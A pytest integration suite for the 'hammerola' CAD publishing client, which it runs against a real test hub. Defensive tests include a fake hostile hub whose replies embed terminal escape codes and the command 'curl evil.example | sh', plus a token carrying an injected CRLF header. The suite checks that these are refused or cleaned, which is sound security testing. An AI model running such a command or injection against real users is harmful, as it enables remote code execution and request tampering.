"""The client against a REAL hub, over a real socket.

THIS IS THE TEST THE WHOLE MODULE EXISTS FOR. Publication is broken today
because the two halves of one contract lived in two repositories: step 5 moved
the hub to source trees and to 202, `cad_publish` went on packing a flat build
and waiting for 201, and each suite stayed green about its own half. Nothing
short of running both halves together can catch that, so every test below drives
`cli.main` — argv in, exit code out — at a hub started by `harness.start_hub`,
and then looks at what landed on the hub's disk.

The geometry is stood in for, not the protocol. `harness.copying_builder`
replaces the build (this suite has no CAD kernel and a real build is minutes),
so the tree the client packs is the tree that gets published; everything else —
the archive, the token, the 202, the job, the log, the pointers, the exit code —
is the real thing.
"""

import os
import shlex

import pytest
from modeldir import MODEL_SOURCE, git, git_repo, make_model
from harness import TOKEN, copying_builder, failing_builder

from hammerola import gitsuggest
from hammerola.cli import main


@pytest.fixture(autouse=True)
def configured(monkeypatch, hub):
    """Point the client at the test hub, with the token that hub checks."""
    monkeypatch.setenv("HUB_URL", hub.url)
    monkeypatch.setenv("EDIT_TOKEN", TOKEN)


def run(model, *args):
    return main(["-C", str(model), *args, "--timeout", "60"])


def revisions_of(hub, pid="demo0001"):
    """Every published revision directory, `latest` and `dev` excluded.

    By listing rather than by name, because no test here can predict the name:
    that is the whole change — the id is minted by the hub out of the sources.
    """
    project = hub.project_dir(pid)
    if not project.exists():
        return []
    return sorted(entry.name for entry in project.iterdir()
                  if entry.is_dir() and not entry.is_symlink()
                  and entry.name not in ("dev", "latest"))


def printed_revision(out):
    """The revision id out of the run's own output, as a user would read it."""
    for line in out.splitlines():
        if line.startswith("revision "):
            return line.split()[1].rstrip(":")
    return None


# -- build: the dev slot -----------------------------------------------------
def test_build_publishes_the_dev_slot(hub, model, capsys):
    assert run(model, "build") == 0

    published = hub.project_dir("demo0001") / "dev"
    assert (published / "model.py").read_text().startswith("import cadquery")
    assert (published / "meta.json").is_file()

    out = capsys.readouterr().out
    # The address, printed by the thing that knows it, on a line of its own.
    assert out.rstrip().endswith(f"{hub.url}/project/demo0001/dev/")


def test_build_leaves_latest_and_the_site_index_alone(hub, model):
    """`dev` is the working copy, not a version: the shared surfaces go on
    meaning "the project as of some commit" (SPEC 7.6).

    A local build DOES rewrite index.json now — that is how the `dev` chip on a
    card appears — so what is asserted is the thing that actually matters and
    always did: a project with no commit build has no CARD. The slot is not a
    version of the project, so it cannot put one on the front page.
    """
    assert run(model, "build") == 0
    assert not (hub.project_dir("demo0001") / "latest").exists()
    assert hub.index().json() == []


def test_the_whole_source_tree_arrives_including_subdirectories(hub, tmp_path):
    """Step 2's change, from the client's side: what is pushed is a TREE."""
    model = make_model(tmp_path / "demo", extra={
        "scripts/gen.py": "VALUE = 42\n",
        "ref/vendor/part.step": "ISO-10303-21;\n",
    })
    assert run(model, "build") == 0
    published = hub.project_dir("demo0001") / "dev"
    assert (published / "scripts" / "gen.py").read_text() == "VALUE = 42\n"
    assert (published / "ref" / "vendor" / "part.step").is_file()


def test_the_build_log_reaches_the_person_who_pushed(hub, model, capsys):
    """The replacement for a forge's job log, and the reason step 5 was built."""
    assert run(model, "build") == 0
    out = capsys.readouterr().out
    assert "--- build log ---" in out
    assert "copying builder:" in out


def test_a_second_identical_push_rebuilds_nothing(hub, model, capsys):
    """`Store.settled` answers 200 straight from the request, with no job at
    all — so the client has to recognise it rather than wait for a job id that
    is not coming."""
    assert run(model, "build") == 0
    capsys.readouterr()
    assert run(model, "build") == 0
    out = capsys.readouterr().out
    assert "unchanged" in out
    assert out.rstrip().endswith(f"{hub.url}/project/demo0001/dev/")


def test_the_client_runs_in_the_current_directory_too(hub, model, monkeypatch):
    """-C is a convenience; the ordinary invocation has no arguments at all."""
    monkeypatch.chdir(model)
    assert main(["build"]) == 0
    assert (hub.project_dir("demo0001") / "dev" / "model.py").is_file()


# -- commit: a revision the hub names ---------------------------------------
def test_commit_publishes_a_revision_and_moves_latest(hub, model, capsys):
    """The whole contract in one run: no git anywhere, an id the client never
    chose, and `latest` pointing at it."""
    assert run(model, "commit", "-m", "first revision") == 0

    published = revisions_of(hub)
    assert len(published) == 1
    revision = published[0]
    assert (hub.project_dir("demo0001") / revision / "model.py").is_file()
    assert os.readlink(hub.project_dir("demo0001") / "latest") == revision

    out = capsys.readouterr().out
    assert printed_revision(out) == revision
    assert out.rstrip().endswith(f"{hub.url}/project/demo0001/{revision}/")


def test_the_revision_is_the_digest_of_the_sources(hub, model, capsys):
    """Not an opaque token the hub remembers: the name IS the payload digest,
    so the published directory carries its own name in `.payload.sha256`."""
    assert run(model, "commit") == 0
    revision = revisions_of(hub)[0]

    stamped = (hub.project_dir("demo0001") / revision /
               ".payload.sha256").read_text().strip()
    assert stamped == revision
    assert len(revision) == 64 and all(c in "0123456789abcdef" for c in revision)


def test_the_same_sources_publish_once(hub, model, capsys):
    """Idempotence, and now it cannot come apart from the identifier: the same
    tree hashes to the same name, so the second push finds itself already
    there. 200 from the request, no job, no second directory."""
    assert run(model, "commit") == 0
    first = printed_revision(capsys.readouterr().out)

    assert run(model, "commit") == 0
    out = capsys.readouterr().out
    assert "unchanged" in out
    assert printed_revision(out) == first
    assert revisions_of(hub) == [first]


def test_changed_sources_get_a_different_revision(hub, model, capsys):
    assert run(model, "commit") == 0
    first = printed_revision(capsys.readouterr().out)

    (model / "model.py").write_text("# a different model\n")
    assert run(model, "commit") == 0
    second = printed_revision(capsys.readouterr().out)

    assert second != first
    assert revisions_of(hub) == sorted([first, second])
    assert os.readlink(hub.project_dir("demo0001") / "latest") == second


def test_a_repository_free_directory_publishes_normally(hub, model, capsys):
    """What used to be a refusal. `commit` means "publish a version of this",
    and a directory with no git in it can always do that."""
    assert not (model / ".git").exists()
    assert run(model, "commit", "-m", "no git here") == 0
    assert len(revisions_of(hub)) == 1
    # And nothing was offered, because there is no repository to offer it to.
    assert gitsuggest.HEADLINE not in capsys.readouterr().out


def test_the_job_id_and_the_revision_are_both_shown_and_told_apart(
        hub, model, capsys):
    """Two identifiers leave the hub on one 202 and they address different
    things. The run has to show both, and label which is which."""
    assert run(model, "commit") == 0
    out = capsys.readouterr().out

    revision = printed_revision(out)
    job_line = next(line for line in out.splitlines()
                    if line.startswith("queued as job "))
    job_id = job_line.split()[3].rstrip(":")

    assert job_id != revision
    assert "the version being published" in out
    assert "this build's progress" in job_line


# -- the git commit that is OFFERED afterwards -------------------------------
def test_a_dirty_repository_is_offered_a_commit_carrying_the_revision(
        hub, model, capsys):
    git_repo(model)
    (model / "model.py").write_text("# edited, never committed\n")

    assert run(model, "commit", "-m", "the bracket got thicker") == 0
    out = capsys.readouterr().out
    revision = printed_revision(out)

    assert gitsuggest.HEADLINE in out
    offered = next(line for line in out.splitlines()
                   if line.strip().startswith("git add -A"))
    argv = shlex.split(offered)
    assert "the bracket got thicker" in argv
    assert f"{gitsuggest.TRAILER}: {revision}" in argv

    # OFFERED, not made: the tree is as dirty as it was.
    assert git(model, "status", "--porcelain").stdout.strip()


def test_the_url_is_still_the_last_line_after_the_offer(hub, model, capsys):
    """The offer is two lines of prose in the middle of the output; the bare
    URL still has to be the thing a terminal leaves selected at the end."""
    git_repo(model)
    (model / "model.py").write_text("# edited\n")
    assert run(model, "commit") == 0

    out = capsys.readouterr().out
    revision = printed_revision(out)
    assert out.rstrip().endswith(f"{hub.url}/project/demo0001/{revision}/")


def test_a_clean_repository_is_offered_nothing(hub, model, capsys):
    git_repo(model)
    assert run(model, "commit") == 0
    assert gitsuggest.HEADLINE not in capsys.readouterr().out


def test_build_never_offers_a_commit(hub, model, capsys):
    """`dev` is the working copy, not a version. There is nothing to record."""
    git_repo(model)
    (model / "model.py").write_text("# edited\n")
    assert run(model, "build") == 0
    assert gitsuggest.HEADLINE not in capsys.readouterr().out


def test_an_unchanged_revision_still_offers_the_commit(hub, model, capsys):
    """The second push published nothing, but git still has not recorded the
    first one — the offer is about the repository, not about the rebuild."""
    git_repo(model)
    (model / "model.py").write_text("# edited\n")
    assert run(model, "commit", "-m", "same again") == 0
    capsys.readouterr()

    assert run(model, "commit", "-m", "same again") == 0
    out = capsys.readouterr().out
    assert "unchanged" in out
    assert gitsuggest.HEADLINE in out


# -- --force -----------------------------------------------------------------
def test_force_travels_from_the_command_line_into_the_build(hub_factory, model,
                                                            monkeypatch):
    """The whole channel at once, and it is new all the way along.

    No option has ever reached the build process from the command line before:
    `--force` goes into a query parameter on the publish URL, out of it in the
    request handler, through the task and the worker, and arrives as an argument
    of the call the builder is made with. Every hop is somewhere else, so what
    is worth holding is the END of it — the value the builder was really handed
    — under both verbs and with the flag left off.

    THE MODEL IS CHANGED BEFORE THE LAST PUSH on purpose: without an edit those
    are sources the hub already has, and `Store.settled` answers 200 with no
    build at all, so the run would prove nothing about the flag.
    """
    seen = []

    def recording_builder(project_dir, out_dir, *, pid, force, **kw):
        seen.append(force)
        return copying_builder(project_dir, out_dir, pid=pid, **kw)

    watched = hub_factory(build_runner=recording_builder)
    monkeypatch.setenv("HUB_URL", watched.url)

    assert run(model, "build", "--force") == 0
    assert run(model, "commit", "--force") == 0
    (model / "model.py").write_text(MODEL_SOURCE + "\n# edited\n",
                                    encoding="utf-8")
    assert run(model, "build") == 0

    assert seen == [True, True, False]


# -- failures ----------------------------------------------------------------
def test_a_failed_build_is_a_non_zero_exit_with_its_log(hub_factory, model,
                                                        monkeypatch, capsys):
    broken = hub_factory(build_runner=failing_builder(
        log="gate: model.py declares no printables\n"))
    monkeypatch.setenv("HUB_URL", broken.url)

    assert run(model, "build") == 1
    captured = capsys.readouterr()
    assert "gate: model.py declares no printables" in captured.out
    assert "the build failed" in captured.err
    # Nothing was published: the slot was never created.
    assert not (broken.project_dir("demo0001") / "dev").exists()


def test_a_bad_token_fails_with_the_hubs_own_answer(hub, model, monkeypatch,
                                                    capsys):
    monkeypatch.setenv("EDIT_TOKEN", "not-the-token")
    assert run(model, "build") == 1
    assert "401" in capsys.readouterr().err


def test_a_missing_hub_url_fails_before_anything_is_packed(model, monkeypatch,
                                                           capsys):
    monkeypatch.delenv("HUB_URL", raising=False)
    assert run(model, "build") == 1
    assert "HUB_URL is not set" in capsys.readouterr().err


def test_a_missing_token_fails_before_anything_is_packed(model, monkeypatch,
                                                         capsys):
    monkeypatch.delenv("EDIT_TOKEN", raising=False)
    assert run(model, "build") == 1
    assert "EDIT_TOKEN is not set" in capsys.readouterr().err


@pytest.mark.parametrize("bad_url, why", [
    ("http://127.0.0.1:8O80", "a letter O in the port"),
    ("//hub.example", "a scheme somebody left off"),
    ("http://[hub.example", "a bracket that is never closed"),
])
def test_an_address_with_a_TYPO_is_caught_before_anything_is_packed(
        model, monkeypatch, capsys, bad_url, why):
    """The half the two tests above only claim, and the half that was missing.

    Reading the settings early catches the variable being ABSENT; a typo INSIDE
    it was caught by `Hub.__init__`, which stood BELOW `pack` — so the whole
    tree was walked, hashed and compressed before the tool said the address was
    unusable. That is the exact minute of pointless work the comment above the
    settings claims to be avoiding.

    Observed rather than argued: `pack` is replaced by something that fails the
    test if it is called at all. Asserting on the message would have passed with
    the old order too.
    """
    from hammerola import cli

    def must_not_be_called(*args, **kwargs):
        raise AssertionError(
            f"the tree was packed before the address was checked ({why})")

    monkeypatch.setenv("HUB_URL", bad_url)
    monkeypatch.setattr(cli, "pack", must_not_be_called)

    assert run(model, "build") == 1
    assert "HUB_URL" in capsys.readouterr().err


def test_a_token_that_cannot_be_sent_is_caught_before_anything_is_packed(
        model, monkeypatch, capsys):
    """The same for the other setting, and the refusal names the TOKEN rather
    than the address — the two settings need opposite advice.

    The line break is in the MIDDLE of the value, not at the end, and that is
    not an arbitrary choice: `config.resolve` strips what it reads, so a
    trailing newline never survives to be sent. What does survive is a value
    somebody assembled — which is also the shape that would append a header of
    its own to every request this tool makes.
    """
    from hammerola import cli

    def must_not_be_called(*args, **kwargs):
        raise AssertionError("the tree was packed before the token was checked")

    monkeypatch.setenv("EDIT_TOKEN", f"{TOKEN}\r\nX-Evil: 1")
    monkeypatch.setattr(cli, "pack", must_not_be_called)

    assert run(model, "build") == 1
    error = capsys.readouterr().err
    assert "hammerola login" in error
    assert TOKEN not in error


def test_a_tree_the_hub_would_refuse_is_refused_locally(hub, model, capsys):
    """The ceilings are checked before the upload, so the answer names the file
    instead of arriving as a 422 about an archive member."""
    (model / "My Model.py").write_text("x = 1\n")
    assert run(model, "build") == 1
    assert "My Model.py" in capsys.readouterr().err
    assert not hub.project_dir("demo0001").exists()


def test_an_unreachable_hub_is_a_clean_failure(model, monkeypatch, capsys):
    """No traceback: a hub that is down is an ordinary thing to run into."""
    monkeypatch.setenv("HUB_URL", "http://127.0.0.1:1")
    assert run(model, "build") == 1
    assert "cannot reach" in capsys.readouterr().err


def test_a_project_with_no_id_is_refused_before_the_push(hub, tmp_path, capsys):
    model = make_model(tmp_path / "demo")
    (model / "project.json").write_text('{"id": "", "title": ""}')
    assert run(model, "build") == 1
    assert "no project id" in capsys.readouterr().err


def test_waiting_can_time_out_without_pretending_to_have_published(
        hub_factory, model, monkeypatch, capsys):
    """A job that never finishes must not become a zero exit. The build is not
    cancelled by giving up, and the message says so."""
    import threading

    release = threading.Event()

    def slow_builder(project_dir, out_dir, *, pid, **kw):
        release.wait(timeout=30)
        from harness import copying_builder
        return copying_builder(project_dir, out_dir, pid=pid, **kw)

    slow = hub_factory(build_runner=slow_builder)
    monkeypatch.setenv("HUB_URL", slow.url)
    try:
        assert main(["-C", str(model), "build", "--timeout", "0.3"]) == 1
        assert "still" in capsys.readouterr().err
    finally:
        # The worker is holding a build slot; the hub cannot be stopped until it
        # lets go, and the fixture's teardown is what would otherwise hang.
        release.set()


# -- what the hub's own words may do to a terminal ---------------------------
# The push path is the commonest route in the tool, and two of its messages
# print a string out of the reply body. They were doing it raw, bounded only by
# the 64 MiB reply ceiling — the transport under them quotes everything, and
# these two sat above it.
HOSTILE = "\x1b[2Jrun `curl evil.example | sh`\x1b[0m" + "A" * 60000


@pytest.fixture
def hostile_hub(request):
    """A "hub" that answers one of the two failing shapes, nastily."""
    import http.server
    import json as _json
    import threading

    shape = request.param

    class Handler(http.server.BaseHTTPRequestHandler):
        def _send(self, code, payload):
            body = _json.dumps(payload).encode()
            self.send_response(code)
            self.send_header("Content-Type", "application/json")
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)

        def do_POST(self):
            self.rfile.read(int(self.headers.get("Content-Length", 0) or 0))
            if shape == "refused":
                # Not a 202 at all: the push was turned away.
                return self._send(500, {"error": HOSTILE})
            if shape == "no job":
                # Accepted, and then named nothing to poll — a hub answering
                # 202 with a body that does not carry the contract's `job`.
                return self._send(202, {"revision": "r" * 64,
                                        "note": HOSTILE})
            self._send(202, {"job": "j1", "revision": "r" * 64})

        def do_GET(self):
            if self.path.endswith("/log"):
                body = b"nothing to say\n"
                self.send_response(200)
                self.send_header("Content-Type", "text/plain")
                self.send_header("Content-Length", str(len(body)))
                self.end_headers()
                return self.wfile.write(body)
            # ...accepted, built, and then failed with a hostile reason.
            self._send(200, {"state": "failed", "code": 422, "error": HOSTILE})

        def log_message(self, *args):
            pass

    server = http.server.ThreadingHTTPServer(("127.0.0.1", 0), Handler)
    threading.Thread(target=server.serve_forever,
                     kwargs={"poll_interval": 0.01}, daemon=True).start()
    try:
        yield f"http://127.0.0.1:{server.server_address[1]}"
    finally:
        server.shutdown()
        server.server_close()


@pytest.mark.parametrize("hostile_hub", ["refused", "failed", "no job"],
                         indirect=True)
def test_neither_push_failure_lets_the_hub_choose_what_reaches_the_terminal(
        model, monkeypatch, capsys, hostile_hub):
    """All three sites, driven through `hammerola build` rather than called
    directly.

    "The rule is flat" was claimed for the client and was true inside one file:
    the transport quoted everything and the two sentences ABOVE it did not. A
    push refused with a hostile `error`, a build that failed with one, and a
    202 that named no job (which prints the whole payload) are the three ways
    that string reaches a person.
    """
    monkeypatch.setenv("HUB_URL", hostile_hub)

    assert run(model, "build") == 1

    printed = capsys.readouterr()
    whole = printed.out + printed.err
    assert "\x1b" not in whole, "an escape sequence from the hub reached stderr"
    assert len(whole) < 4000, f"{len(whole)} characters"


# -- which stream each of the wait's two accounts goes to --------------------
@pytest.fixture
def flaky_hub():
    """A "hub" whose first poll is answered by the EDGE and not by it.

    The 404 is Traefik's own — Go's `http.NotFound`, byte for byte as it was
    measured on the deployment — so the client cannot identify it as the hub's
    verdict and outlives it; the build then reports `building` and `done`. That
    is the incident of `tests/client/test_polling.py` driven through the actual
    command, which is the only place the two streams exist at all.
    """
    import http.server
    import json as _json
    import threading

    polls = []

    class Handler(http.server.BaseHTTPRequestHandler):
        def _send(self, code, body, content_type="application/json"):
            self.send_response(code)
            self.send_header("Content-Type", content_type)
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)

        def do_POST(self):
            self.rfile.read(int(self.headers.get("Content-Length", 0) or 0))
            self._send(202, _json.dumps({"job": "j1",
                                         "revision": "r" * 64}).encode())

        def do_GET(self):
            if self.path.endswith("/log"):
                # Deliberately says neither "building" nor "still waiting": the
                # log is the other thing on stdout, and a word of it landing in
                # either assertion below would make the test pass for the wrong
                # reason.
                return self._send(200, b"nothing to say\n", "text/plain")
            polls.append(self.path)
            if len(polls) == 1:
                return self._send(404, b"404 page not found\n",
                                  "text/plain; charset=utf-8")
            state = "building" if len(polls) == 2 else "done"
            self._send(200, _json.dumps(
                {"state": state,
                 "build_url": "/project/demo0001/dev/"}).encode())

        def log_message(self, *args):
            pass

    server = http.server.ThreadingHTTPServer(("127.0.0.1", 0), Handler)
    threading.Thread(target=server.serve_forever,
                     kwargs={"poll_interval": 0.01}, daemon=True).start()
    try:
        yield f"http://127.0.0.1:{server.server_address[1]}"
    finally:
        server.shutdown()
        server.server_close()


def test_the_build_states_go_to_stdout_and_the_connection_goes_to_stderr(
        model, monkeypatch, capsys, flaky_hub):
    """The two callbacks are bound to two streams and NOTHING observed it.

    `_publish` hands `on_state` to stdout and `on_notice` to stderr with a
    comment saying exactly that, and all three ways of breaking it survived the
    suite: dropping the `on_notice=` argument entirely (the connection then goes
    unreported, which is the silence that made the incident confusing), and
    sending either callback to the other stream. `await_job` is tested against a
    socket everywhere else, but the callbacks there are lists — the streams
    exist only here, at the end of the real command.

    It matters beyond tidiness: the states are the progress of the build, which
    is what this command is REPORTING and what a caller redirects or pipes,
    while a notice is about the connection and belongs with the other things
    that went wrong on the way.
    """
    from hammerola import hub as hub_module

    # Both cadences, so an outage costs a hundredth of a second rather than the
    # production second. The behaviour is what is under test, not the numbers.
    monkeypatch.setattr(hub_module, "POLL_FIRST_SECONDS", 0.01)
    monkeypatch.setattr(hub_module, "POLL_ERROR_FIRST_SECONDS", 0.01)
    monkeypatch.setenv("HUB_URL", flaky_hub)

    assert run(model, "build") == 0

    printed = capsys.readouterr()
    assert "still waiting, the build may be running" in printed.err, printed.err
    assert "still waiting" not in printed.out, (
        "a notice about the CONNECTION was printed as build progress")
    assert "  building" in printed.out, printed.out
    assert "  done" in printed.out, printed.out
    assert "building" not in printed.err, (
        "the build's own progress was reported as something that went wrong")
